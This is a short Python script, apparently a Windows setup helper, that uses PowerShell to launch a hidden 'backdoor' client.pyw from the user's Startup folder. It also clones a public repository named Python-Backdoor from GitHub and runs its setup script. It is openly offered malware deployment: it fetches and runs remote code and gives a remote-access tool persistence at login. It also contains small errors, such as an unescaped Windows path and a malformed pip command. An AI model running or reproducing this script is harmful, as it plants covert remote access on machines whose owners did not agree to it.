import subprocess 
import sys

# TODO: use relative path instead

python_path = 'C:/Users/jan-h/AppData/Local/Programs/Python/Python36/python.exe'
pythonw_path = 'C:/Users/jan-h/AppData/Local/Programs/Python/Python36/pythonw.exe'

sys.path.append(python_path)
# sys.path.append(pythonw_path)

def run(cmd):
    try:
        out = subprocess.run(
            ['powershell', '-command', cmd],
            stdout = subprocess.PIPE
        )
        print(out.stdout)
    except Exception as e:
        print(e)
        pass

run('{0} -m pip install requirements.txt'.format(python_path))

backdoor_loc = "C:\Users\jan-h\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\client.pyw"

run('{0} {1}'.format(pythonw_path, backdoor_loc))

run('git clone https://github.com/xp4xbox/Python-Backdoor.git')

run('{0} Python-Backdoor/src/setup.py'.format(python_path))
